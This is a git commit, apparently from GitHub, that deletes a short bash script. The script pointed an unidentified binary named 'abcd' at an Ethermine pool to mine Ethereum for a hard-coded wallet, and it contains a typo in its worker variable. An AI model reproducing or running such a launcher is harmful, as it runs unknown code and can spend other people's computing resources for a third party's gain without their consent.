556978bf6fe2033f9f6aa7d854c85632e0d68377
Preetnub <90266049+Preetnub@users.noreply.github.com>
2021-09-07 20:35:13 +0530

    Delete abch.sh

--- abch.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-POOL=us1.ethermine.org:4444
-WALLET=0xccCc70822F17f042E52Ce1480795109baEdEc44A
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-abhi)
-chmod +x abcd
-./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
-
